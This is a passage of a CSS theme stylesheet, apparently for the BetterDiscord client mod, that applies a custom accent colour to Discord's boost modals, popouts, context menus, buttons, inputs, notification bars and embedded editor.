.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.apple-1fKN59 {
	-webkit-mask: url(https://discordapp.com/assets/7ddab19e24325212299490c2f413b122.svg);
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.windows-29yOum {
	-webkit-mask: url(https://discordapp.com/assets/37ce528f3abf4d735a624309e990acc6.svg);
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.linux-15cW1y {
	-webkit-mask: url(https://discordapp.com/assets/f8e3f6e7b2cf5f10aed43243560a1b91.svg);
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.ios-Z7K-rr {
	-webkit-mask: url(https://discordapp.com/assets/00a1b0447f0474ecaa767a4bc09fe2ed.svg);
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ.android-gGrHJu {
	-webkit-mask: url(https://discordapp.com/assets/676bfec9f4343f6fcdf0a12ae313a3de.svg);
}

.browserItem-1mKMYK:hover {
	border-color: rgb(var(--vaccentcolor));
}
.browserItem-1mKMYK:hover .btn-3wPLTq {
	background-color: rgb(var(--vaccentcolor));
	border-color: rgb(var(--vaccentcolor));
}

/* ----		10.8.	GUILDBOOSTMODAL					---- */

															/* modal				boost header						*/
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] {
	object-position: -999999px -999999px;
	width: 96px;
	height: 60px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_boostheader_bg.svg) center/cover no-repeat;
}
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] + *:not(svg),
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] + svg + * {
	position: relative;
}
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] + *:not(svg)::after,
.headerGraphic-nVhv-X[src="/assets/50f02014a2ac385c90461d9a4b80e482.svg"] + svg + *::after {
	content: "";
	position: absolute;
	top: -132px;
	left: calc((100% - 96px) / 2);
	width: 96px;
	height: 60px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_boostheader_accent.svg) center/cover no-repeat;
}
.badgeIconWithSubscribers-3PlMu9 {							/* modal				sub badge icon						*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .icon-QVoPRH {									/* modal				perkicon general					*/
	color: rgb(var(--vaccentcolor));
}
															/* modal				tiermarker in progress tier3		*/
#app-mount .tierMarkerInProgress-24LMzJ .currentTierIcon-2gcTCn.tier3Icon-Ku4Ahe {
	color: rgb(var(--vaccentcolor));
}
.tierMarkerAccomplished-2MiXeg {							/* modal				tiermarker accomplished				*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.7)) !important;
}
#app-mount .barForeground-3KglC8 {							/* modal				tierbarfill							*/
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .barSecondary-3B1aP2 {							/* modal				previewbarfill						*/
	background: var(--interactive-hover) linear-gradient(90deg, rgba(var(--vaccentcolor), 0.3), rgba(var(--vaccentcolor), 0.3));
}
#app-mount .iconIncluded-24npcq {							/* modal				included perkicon					*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .upload-2-2ZMI {									/* modal				perkicon upload						*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .animated-XlVkOl {								/* modal				perkicon animated					*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(75%);
}
#app-mount .stream-3mNTxK {									/* modal				perkicon stream						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(150%);
}
#app-mount .tierUnlocked-25K6Kv {							/* modal				tierunlocked						*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .tierHeaderUnlocked-1n-OTI {						/* modal				tierheaderunlockedbg				*/
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.wrapper-3nSjSv {											/* modal				boostaddwrapper						*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.wrapper-3nSjSv::before,									/* modal				boostangel							*/
.wrapper-3nSjSv::after {
	content: "";
	position: absolute;
	top: -44px;
	right: -82px;
	width: 168px;
	height: 88px;
}
.wrapper-3nSjSv::before {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_boostangel_bg.svg) center/cover no-repeat;
}
.wrapper-3nSjSv::after {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_boostangel_accent.svg) center/cover no-repeat;
}
.tierMarkerLabelPlusIcon-1OS7E9 {							/* modal				prebuy icon							*/
	color: rgb(var(--vaccentcolor));
}
.upsellFooterIcon-2105bD path {								/* prebuy popout		footer icon							*/
	fill: rgb(var(--vaccentcolor));
}
.perkIconGuild-KLNhuR {										/* prebuy popout		perkicon guild						*/
	color: rgb(var(--vaccentcolor));
}
.perkIconChatPerks-BnKNFh {									/* prebuy popout		perkicon chat						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(120%);
}
.perkIconStream-7wqAvn {									/* prebuy popout		perkicon stream						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(150%);
}

/* ----		10.9.	STREAMSETTINGSMODAL				---- */

.selectorButtonSelected-336oUc,								/* modal				selectorselectedbutton				*/
.selectorButtonSelected-1j4DmC {
	background-color: rgb(var(--vaccentcolor));
}
.badgeUpgrade-1DzdNZ {										/* modal				badgeupgrade						*/
	color: rgb(var(--vaccentcolor));
}
.imageSelected-4Kl81J {										/* modal				imageselected						*/
	border-color: rgb(var(--vaccentcolor));
}
.tile-2silOL:hover .sourceThumbnail-14Iubx {				/* modal				sourcethumbnail						*/
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor));
}
.sourceThumbnail-14Iubx.selected-3Qtv-u {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor));
}

/* ----		10.10.	DISPATCHERRORMODAL				---- */

.theme-light .closeLink-2MRAUp {							/* modal				closelink							*/
	color: rgb(var(--vaccentcolor));
}

/* ----		10.11.	CHANGELOGMODAL					---- */

.content-s2SEQO a {											/* modal				link								*/
	color: var(--text-link);
}
.improved-1NJK-y {											/* modal				improved category					*/
	color: rgb(var(--vaccentcolor));
}
.improved-1NJK-y::after {
	background-color: rgb(var(--vaccentcolor));
}

.premiumBanner-rP6H1S {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

/* ----		10.12.	SCREENSHAREMODAL				---- */

.tile-2w4k5N:hover .sourceThumbnail-27dolk {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor));
}
.sourceThumbnail-27dolk.selected-1nOkyc {
	box-shadow: inset 0 0 0 2px rgb(var(--vaccentcolor));
}
.selectorButton-EEUWed:not(.selectorButtonPremiumRequired-mKMbIu):hover {
	background-color: rgb(var(--vaccentcolor));
}
.selectorButtonSelected-t5V9On {
	background-color: rgb(var(--vaccentcolor));
}

/* ----		10.13.	PHONEVERIFICATIONMODAL			---- */

.phoneVerificationModal-OzcDc3 path[fill="rgb(118,134,177)"] {
	fill: rgb(var(--vaccentcolor));
}


/* ~~~~		11.		POPOUTS							~~~~ */

.popoutLeft-3aViER.arrowAlignmentTop-1yftWI::before {
	border-left-color: #rgb(var(--vaccentcolor));
}
.popoutRight-1veHKi.arrowAlignmentTop-1yftWI::before {
	border-right-color: #rgb(var(--vaccentcolor));
}
.popoutBottom-2GAFPg.arrowAlignmentMiddle-NBGtsX::before,
.popoutBottom-2GAFPg.arrowAlignmentTop-1yftWI::before,
.popoutBottomLeft-1pG8B4.arrowAlignmentMiddle-NBGtsX::before,
.popoutBottomLeft-1pG8B4.arrowAlignmentTop-1yftWI::before,
.popoutBottomRight-2Rno5S.arrowAlignmentMiddle-NBGtsX::before,
.popoutBottomRight-2Rno5S.arrowAlignmentTop-1yftWI::before,
.theme-light.popoutBottom-2GAFPg.arrowAlignmentMiddle-NBGtsX::before,
.theme-light.popoutBottom-2GAFPg.arrowAlignmentTop-1yftWI::before,
.theme-light.popoutBottomLeft-1pG8B4.arrowAlignmentMiddle-NBGtsX::before,
.theme-light.popoutBottomLeft-1pG8B4.arrowAlignmentTop-1yftWI::before,
.theme-light.popoutBottomRight-2Rno5S.arrowAlignmentMiddle-NBGtsX::before,
.theme-light.popoutBottomRight-2Rno5S.arrowAlignmentTop-1yftWI::before {
	border-bottom-color: #rgb(var(--vaccentcolor));
}
.popoutInvert-3TZnzz:not(.popoutBottom-2GAFPg).popoutTop-3WSJtH.arrowAlignmentMiddle-NBGtsX::before,
.popoutInvert-3TZnzz:not(.popoutBottom-2GAFPg).popoutTop-3WSJtH.arrowAlignmentTop-1yftWI::before,
.popoutInvert-3TZnzz:not(.popoutBottom-2GAFPg).popoutTopRight-1lc8Mq.arrowAlignmentMiddle-NBGtsX::before,
.popoutInvert-3TZnzz:not(.popoutBottom-2GAFPg).popoutTopRight-1lc8Mq.arrowAlignmentTop-1yftWI::before {
	border-top-color: #rgb(var(--vaccentcolor));
}
.theme-light.contentNarrowMedia-W7SHxH.topArrow-1B63md::before,
.theme-light .contentNarrowNoMedia-Il01H1.topArrow-1B63md::before,
.theme-light.contentWideNoMedia-22TIu6.topArrow-1B63md::before,
.theme-light .contentWideNoMedia-22TIu6.topArrow-1B63md::before {
	border-bottom-color: #rgb(var(--vaccentcolor));
}

/* ----		11.1.	CONTEXTMENU						---- */

.colorBrand-ROmMP1,											/* contextmenu			brand								*/
.colorPremium-p4p7qO {										/* contextmenu			premium								*/
	color: rgb(var(--vaccentcolor));
}
.colorDefault-2K3EoJ.focused-3afm-j,
.colorDefault-2K3EoJ:hover:not(.hideInteraction-1iHO1O),
.colorDefault-2K3EoJ:active:not(.hideInteraction-1iHO1O) {
	background-color: rgb(var(--vaccentcolor));
}
.colorDanger-2qLCe1.focused-3afm-j,
.colorDanger-2qLCe1:hover:not(.hideInteraction-1iHO1O),
.colorDanger-2qLCe1:active:not(.hideInteraction-1iHO1O) {
	background-color: #F04747;
}
.colorDefault-2K3EoJ .radioSelection-1HmrQS {				/* contextmenu			radioselection						*/
	color: rgb(var(--vaccentcolor));
}
.colorDanger-2qLCe1 .radioSelection-1HmrQS {
	color: #F04747;
}
.colorDefault-2K3EoJ .checkbox-3s5GYZ {						/* contextmenu			checkbox							*/
	color: rgb(var(--vaccentcolor));
}
.colorDanger-2qLCe1 .checkbox-3s5GYZ {
	color: #F04747;
}
.colorDefault-2K3EoJ.focused-3afm-j .check-1JyqgN,			/* contextmenu			checkmark							*/
.colorDefault-2K3EoJ:hover:not(.hideInteraction-1iHO1O) .check-1JyqgN,
.colorDefault-2K3EoJ:active:not(.hideInteraction-1iHO1O) .check-1JyqgN {
	color: rgb(var(--vaccentcolor));
}
.colorDanger-2qLCe1.focused-3afm-j .check-1JyqgN,			/* contextmenu			checkmark							*/
.colorDanger-2qLCe1:hover:not(.hideInteraction-1iHO1O) .check-1JyqgN,
.colorDanger-2qLCe1:active:not(.hideInteraction-1iHO1O) .check-1JyqgN {
	color: #F04747;
}
.colorPremium-p4p7qO .icon-LYJorE {							/* contextmenu			premiumicon							*/
	color: rgb(var(--vaccentcolor));
}

/* ----		11.2.	USERPOPOUT						---- */

.headerPlaying-j0WQBV {
	background: rgb(var(--vaccentcolor));
}
.headerStreaming-2FjmGz {
	background: #593695;
}

/* ----		11.3.	EMOJIPICKER						---- */

.emojiPicker-3m1S-j .categories-1feg4n .selected-39BZ4S {	/* emojipicker			selected category					*/
	border-bottom-color: rgb(var(--vaccentcolor));
}

/* ----		11.4.	PINS/MENTIONS					---- */

.hasMoreButton-1MELpI {										/* popout				hasmore button						*/
	color: rgb(var(--vaccentcolor));
}

/* ----		11.5.	SEARCHPOPOUT					---- */
															/* datepicker			day hover							*/
#app-mount .calendarPicker-2yf6Ci .react-datepicker__day.react-datepicker__day--selected:hover,
#app-mount .calendarPicker-2yf6Ci .react-datepicker__day:not(.react-datepicker__day--disabled):hover {
	background-color: rgb(var(--vaccentcolor));
}
															/* datepicker			day selectd							*/
#app-mount .calendarPicker-2yf6Ci .react-datepicker__day.react-datepicker__day--selected::after {
	background-color: rgb(var(--vaccentcolor));
}
															/* datepicker			hintvalue							*/
#app-mount .datePicker--XZbmJ .datePickerHint-3Q1Udw .hintValue-29ny8Z {
	background-color: rgb(var(--vaccentcolor));
}


/* ~~~~		12.		GENERAL							~~~~ */

.wanderingCubesItem-WPXqao {								/* loading				cubes								*/
	background-color: rgb(var(--vaccentcolor));
}
.chasingDotsItem-2DVNUn {									/* loading				dots								*/
	background-color: rgb(var(--vaccentcolor));
}
.theme-light .path-92Hmty,									/* loading				circle								*/
.theme-dark .path-92Hmty,
.theme-dark .path2-1q7bG_ {
	stroke: rgb(var(--vaccentcolor));
}

/* ----		12.1.	TEXT							---- */

.brand-2-tkdo {
	color: rgb(var(--vaccentcolor));
}
.colorBrand-2tjs5J {
	color: rgb(var(--vaccentcolor));
}
.tipTitle-GL9qAt {
	color: rgb(var(--vaccentcolor));
}

/* ----		12.2.	BUTTONS							---- */

#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91 .spinnerItem-3GlVyU,
#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91 .spinnerItem-3GlVyU,
#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91 .spinnerItem-3GlVyU,
#app-mount .lookLink-9FtZy-.colorBrand-3pXr91 .spinnerItem-3GlVyU {
	background-color: rgb(var(--vaccentcolor));
}

#app-mount .btn-1PnLxm.btnPrimary-1jluZW:hover:not(:disabled),
#app-mount .lookFilled-1Gx00P.colorBrand-3pXr91:not(.buttonColor-7qQbGO):hover,
#app-mount .lookFilled-1Gx00P.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	background: var(--vaccentcolor-hover);
}
#app-mount .lookFilled-1Gx00P.colorBrand-3pXr91:not(.buttonColor-7qQbGO):active,
#app-mount .lookFilled-1Gx00P.hoverBrand-1_Fxlk.hasHover-3X1-zV:active {
	background: var(--vaccentcolor-active);
}
#app-mount .btn-1PnLxm.btnPrimary-1jluZW,
#app-mount .lookFilled-1Gx00P.colorBrand-3pXr91:not(.buttonColor-7qQbGO),
#app-mount .lookFilled-1Gx00P.colorBrand-3pXr91:not(.buttonColor-7qQbGO):disabled {
	background: rgb(var(--vaccentcolor));
}

#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91:hover,
#app-mount .lookInverted-2D7oAl.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	background-image: linear-gradient(0deg, rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1));
}
#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91:active,
#app-mount .lookInverted-2D7oAl.hoverBrand-1_Fxlk.hasHover-3X1-zV:active {
	background-image: linear-gradient(0deg, rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2));
}
#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91,
#app-mount .lookInverted-2D7oAl.colorBrand-3pXr91:disabled {
	color: rgb(var(--vaccentcolor));
}

#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91:hover,
#app-mount .lookOutlined-3sRXeN.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	border-color: rgba(var(--vaccentcolor), 0.6);
}
#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91:active,
#app-mount .lookOutlined-3sRXeN.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	background-color: rgba(var(--vaccentcolor), 0.1);
	border-color: rgb(var(--vaccentcolor));
}
#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91,
#app-mount .lookOutlined-3sRXeN.colorBrand-3pXr91:disabled {
	border-color: rgba(var(--vaccentcolor), 0.1);
	color: rgb(var(--vaccentcolor));
}

#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91:hover,
#app-mount .lookGhost-2Fn_0-.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover {
	background-color: rgba(var(--vaccentcolor), 0.15);
}
#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91:active,
#app-mount .lookGhost-2Fn_0-.hoverBrand-1_Fxlk.hasHover-3X1-zV:active {
	background-color: rgba(var(--vaccentcolor), 0.2);
}
#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91,
#app-mount .lookGhost-2Fn_0-.colorBrand-3pXr91:disabled {
	background-color: rgba(var(--vaccentcolor), 0.1);
	color: rgb(var(--vaccentcolor));
}

#app-mount .lookLink-9FtZy-.colorBrand-3pXr91 {
	color: rgb(var(--vaccentcolor));
}
#app-mount .lookLink-9FtZy-.colorBrand-3pXr91:hover .contents-18-Yxp,
#app-mount .lookLink-9FtZy-.hoverBrand-1_Fxlk.hasHover-3X1-zV:hover .contents-18-Yxp {
	background-image: linear-gradient(0deg, transparent, transparent 1px, rgb(var(--vaccentcolor)) 0, rgb(var(--vaccentcolor)) 2px, transparent 0);
	color: rgb(var(--vaccentcolor));
}

/* ----		12.3.	INPUTS							---- */

.input-cIJ7To.focused-1mmYsC,								/* textinput			focused								*/
.input-cIJ7To:focus {
	border-color: rgb(var(--vaccentcolor));
}
.input-cIJ7To.error-2O5WFJ {
	border-color: #f04747;
}
.input-cIJ7To.success-2-F980 {
	border-color: #43b581;
}
.focused-1mmYsC {
	border-color: rgb(var(--vaccentcolor));
}
#app-mount .prefixInput-14nUik.focused-2QzoMt {
	border-color: rgb(var(--vaccentcolor));
}
															/* checkbox				checked 							*/
.checkbox-3kaeSU .checkboxInner-3yjcPe .checkboxElement-1qV33p:checked + span {
	background-color: rgb(var(--vaccentcolor));
	border-color: rgb(var(--vaccentcolor));
}
															/* checkbox				checked alt							*/
.checkbox-3kaeSU .checkboxInner-3yjcPe.alt-6FvZrq .checkboxElement-1qV33p:checked + span::after {
	border-color: rgb(var(--vaccentcolor));
}

.checked-3_4uQ9[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}
.checked-3_4uQ9[style*="border-color: rgb(114, 137, 218)"] {
	border-color: rgb(var(--vaccentcolor)) !important;
}

.container-3auIfb {											/* switch				unchecked							*/
	background-color: rgb(114, 118, 125) !important;
	transition: background-color .1s ease-out;
}															/* switch				checked								*/
.container-3auIfb[style*="background-color: rgb(67, 181, 129)"],
.container-3auIfb[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgba(var(--vaccentcolor), 0.8) !important;
}
.container-3auIfb[style*="background-color: rgb(67, 181, 129)"]:hover,
.container-3auIfb[style*="background-color: rgb(114, 137, 218)"]:hover {
	background: var(--vaccentcolor-hover);
}
.container-3auIfb[style*="background-color: rgb(67, 181, 129)"]:active,
.container-3auIfb[style*="background-color: rgb(114, 137, 218)"]:active {
	background: var(--vaccentcolor-active);
}
.container-3auIfb path[fill] {
	fill: rgb(114, 118, 125) !important;
}
.container-3auIfb[style*="background-color: rgb(67, 181, 129)"] path[fill],
.container-3auIfb[style*="background-color: rgb(114, 137, 218)"] path[fill] {
	fill: rgb(var(--vaccentcolor)) !important;
}

.barFill-23-gu- {											/* slider				barfill								*/
	background: rgb(var(--vaccentcolor));
}
.mediaBarGrabber-1FqnbN,									/* progessbar			grabber								*/
.mediaBarProgress-1xaPtl,									/* progessbar			barfill								*/
.mediaBarProgress-1xaPtl::after,
.mediaBarProgress-1xaPtl::before {
	background-color: rgb(var(--vaccentcolor));
}
.mediaBarInteraction-37i2O4:hover .mediaBarGrabber-1FqnbN,
.mediaBarInteractionDragging-2QurIZ .mediaBarGrabber-1FqnbN {
	background-color: rgb(var(--vaccentcolor));
	filter: brightness(120%);
}

.theme-light .select-1Pkeg4:focus,							/* dropdown select		nitro subscription					*/
.theme-light .lookFilled-1h1y05.select-1Pkeg4:focus {
	border-color: rgb(var(--vaccentcolor));
}
.theme-light .lookFilled-1h1y05.select-1Pkeg4:hover.selectOpen-hQuR6b,
.theme-light .lookFilled-1h1y05.selectOpen-hQuR6b {
	border-color: rgb(var(--vaccentcolor)) rgb(var(--vaccentcolor)) #b9bbbe;
}
.theme-dark .select-1Pkeg4:focus,
.theme-dark .lookFilled-1h1y05.select-1Pkeg4:focus {
	border-color: rgb(var(--vaccentcolor));
}
.theme-dark .lookFilled-1h1y05.select-1Pkeg4:hover.selectOpen-hQuR6b,
.theme-dark .lookFilled-1h1y05.selectOpen-hQuR6b {
	border-color: rgb(var(--vaccentcolor)) rgb(var(--vaccentcolor)) rgba(0, 0, 0, 0.3);
}

/* ----		12.4.	TAGS							---- */

.botTagRegular-2HEhHi {										/* bottag				regular								*/
	background-color: rgb(var(--vaccentcolor));
}
.botTagInvert-18-95s {										/* bottag				inverted							*/
	color: rgb(var(--vaccentcolor));
}

.verified-1eC5dy {											/* verifiedbadge											*/
	color: rgb(var(--vaccentcolor));
}
.partnered-3nJayh {											/* partneredbadge											*/
	color: rgb(var(--vaccentcolor));
}
.partnered-3nJayh .flowerStar-1GeTsn {
	filter: brightness(75%);
}

/* ----		12.5.	ICONS							---- */

[style*="/assets/f78426a064bc9dd24847519259bc42af.png"],
[src*="/assets/f78426a064bc9dd24847519259bc42af.png"] {		/* avatars				clyde								*/
	object-position: -999999px -999999px;
	background: rgb(var(--vaccentcolor)) url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/clydeicon_details.svg) center/contain no-repeat !important;
}
[style*="/assets/6debd47ed13483642cf09e832ed0bc1b.png"],
[src*="/assets/6debd47ed13483642cf09e832ed0bc1b.png"] {		/* avatars				blue discord						*/
	object-position: -999999px -999999px;
	background: rgb(var(--vaccentcolor)) url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurplediscordicon_details.svg) center/contain no-repeat !important;
}

/* ----		12.6.	SCROLLBARS						---- */

.scrollerThemed-2oenus.themeLight-1_DWyY .scrollbar-2rkZSL .thumb-2JwNFC,
.theme-dark .scrollerThemed-2oenus.themeLight-1_DWyY .scrollbar-2rkZSL .thumb-2JwNFC,
.theme-light .scrollerWrap-2lJEkd .scrollbar-2rkZSL .thumb-2JwNFC,
.theme-light .scrollerThemed-2oenus.themedWithTrack-q8E3vB .scrollbar-2rkZSL .thumb-2JwNFC,
.theme-light .scrollbarDefault-3COgCQ::-webkit-scrollbar-thumb {
	background-color: rgb(var(--vaccentcolor));
}

::-webkit-scrollbar-corner,
#app-mount ::-webkit-scrollbar-corner {
	background-color: transparent;
}

/* ----		12.7.	NOTIFICATIONBAR					---- */

.colorPremiumTier1-3D7SPt {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.7));
}
.colorPremiumTier1-3D7SPt .button-2DhvE9:hover {
	color: rgb(var(--vaccentcolor));
}
.colorPremiumTier2-dCdap5 {
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.colorPremiumTier2-dCdap5 .button-2DhvE9:hover {
	color: rgb(var(--vaccentcolor));
}
.colorBrand-2zeG8h {
	background-color: rgb(var(--vaccentcolor));
}
.colorBrand-2zeG8h .button-2DhvE9:hover {
	color: rgb(var(--vaccentcolor));
}
.notice-3bPHh-[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}
.notice-3bPHh-[style*="background-color: rgb(114, 137, 218)"] .button-2DhvE9:hover {
	color: rgb(var(--vaccentcolor)) !important;
}
.notice-2X5hT5 {											/* preview notice											*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.5), rgba(var(--vaccentcolor), 0.5));
}
.button-2PWmas:hover {										/* preview notice		button								*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.7), rgba(var(--vaccentcolor), 0.7));
}
.notice-1tZwqv {											/* role notice												*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.5), rgba(var(--vaccentcolor), 0.5));
}
.button-3Ijpww:hover {										/* role notice			button								*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.7), rgba(var(--vaccentcolor), 0.7));
}
.notice-3uyY6c {											/* rules notice												*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.5), rgba(var(--vaccentcolor), 0.5));
}
.button-gP4R86:hover {										/* rules notice			button								*/
	background: #000000 linear-gradient(90deg, rgba(var(--vaccentcolor), 0.7), rgba(var(--vaccentcolor), 0.7));
}

/* ----		12.8.	TOOLTIPS						---- */

#app-mount .tooltipBrand-g03Nz8 {
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .tooltipBrand-g03Nz8 .tooltipPointer-3ZfirK {
	border-top-color: rgb(var(--vaccentcolor));
}

.content-3O0wBS {
	background-color: rgb(var(--vaccentcolor));
}
.content-3O0wBS	.button-3zdF3z {
	color: rgb(var(--vaccentcolor));
}
.pointer-3ClhC2 {
	border-top-color: rgb(var(--vaccentcolor));
}

/* ----		12.9.	TOASTS							---- */

.toast-brand {
	background-color: rgb(var(--vaccentcolor));
}


/* ~~~~		13.		BDSUPPORT						~~~~ */

#bd-pub-button {
	color: var(--text-normal);
	transition: background-color .15s ease-out, color .15s ease-out;
}
#bd-pub-button:hover {
	color: rgb(var(--fontwhite1, var(--dfontwhite1)));
	background-color: rgb(var(--vaccentcolor));
}
#bd-pub-button:active {
	color: rgb(var(--fontwhite1, var(--dfontwhite1)));
	background: var(--vaccentcolor-hover);
}
#pubslayer button:hover {
	background: var(--vaccentcolor-hover);
}
#pubslayer button:active {
	background: var(--vaccentcolor-active);
}
.bd-server-card.bd-server-card-pinned::after {
	background: var(--bd-blue);
}

.bd-modal-wrapper .footer button {
	background: var(--bd-blue);
}
.bd-modal-wrapper .footer button:hover {
	background: var(--vaccentcolor-hover);
}
.bd-modal-wrapper .footer button:active {
	background: var(--vaccentcolor-active);
}
.bd-modal-wrapper .error-link {
	color: var(--bd-blue);
}

.bd-pfbtn {
	background: var(--bd-blue);
}
.bd-pfbtn:hover {
	background: var(--vaccentcolor-hover);
}
.bd-pfbtn:active {
	background: var(--vaccentcolor-active);
}

.bd-button {
	background: var(--bd-blue);
}
.bd-button:hover {
	background: var(--vaccentcolor-hover);
}
.bd-button:active {
	background: var(--vaccentcolor-active);
}

.bd-addon-views .bd-view-button.selected {
	background: var(--bd-blue);
}

.bd-addon-list .bd-footer a {
	color: var(--bd-blue);
}

#bd-settingspane-container .ui-switch-item .ui-switch-wrapper .ui-switch.checked,
.bd-switch-checked {
	background-color: rgba(var(--vaccentcolor), 0.8);
}
#bd-settingspane-container .ui-switch-item .ui-switch-wrapper .ui-switch.checked:hover,
.bd-switch-checked:hover {
	background: var(--vaccentcolor-hover);
}
#bd-settingspane-container .ui-switch-item .ui-switch-wrapper .ui-switch.checked:active,
.bd-switch-checked:active {
	background: var(--vaccentcolor-active);
}
.bd-switch::before {
	box-shadow: none;
}

html .monaco-editor .find-widget .monaco-inputbox.synthetic-focus {
	outline-color: rgb(var(--vaccentcolor));
}
html .monaco-editor .monaco-editor-hover a {
	color: rgb(var(--vaccentcolor));
}
html .monaco-editor [class*="arrow-decoration"] {
	border-bottom-color: rgb(var(--vaccentcolor));
}
html .monaco-editor .focused .selected-text {
	background-color: rgb(var(--vaccentcolor));
}

html .monaco-tree[class*="monaco-tree-instance"].focused .monaco-tree-rows > .monaco-tree-row.focused:not(.highlighted) {
	background-color: rgb(var(--vaccentcolor));
	color: #ffffff;
}
html .monaco-tree[class*="monaco-tree-instance"].focused .monaco-tree-rows > .monaco-tree-row.focused:not(.highlighted) .results-group {
	color: #ffffff !important;
}

html .monaco-editor [style*="background-color: rgb(0, 122, 204)"],
html .monaco-editor [style*="background: rgb(0, 122, 204)"],
html .monaco-editor [style*="background-color: rgb(14, 122, 192)"],
html .monaco-editor [style*="background: rgb(14, 122, 192)"],
html .monaco-editor [style*="background-color: rgb(14, 99, 156)"],
html .monaco-editor [style*="background: rgb(14, 99, 156)"],
html .monaco-editor [style*="background-color: rgb(9, 71, 113)"],
html .monaco-editor [style*="background: rgb(9, 71, 113)"] {
	background: rgb(var(--vaccentcolor)) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.9)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.9)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.9)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.9)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.9)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.9)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.9)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.9)"] {
	background: rgba(var(--vaccentcolor), 0.9) !important;
}
html .monaco-editor [style*="background-color: rgba(0, 122, 204, 0.8)"],
html .monaco-editor [style*="background: rgba(0, 122, 204, 0.8)"],
html .monaco-editor [style*="background-color: rgba(14, 122, 192, 0.8)"],
html .monaco-editor [style*="background: rgba(14, 122, 192, 0.8)"],
html .monaco-editor [style*="background-color: rgba(14, 99, 156, 0.8)"],
html .monaco-editor [style*="background: rgba(14, 99, 156, 0.8)"],
html .monaco-editor [style*="background-color: rgba(9, 71, 113, 0.8)"],
html .monaco-editor [style*="background: rgba(9, 71, 113, 0.8)"] {
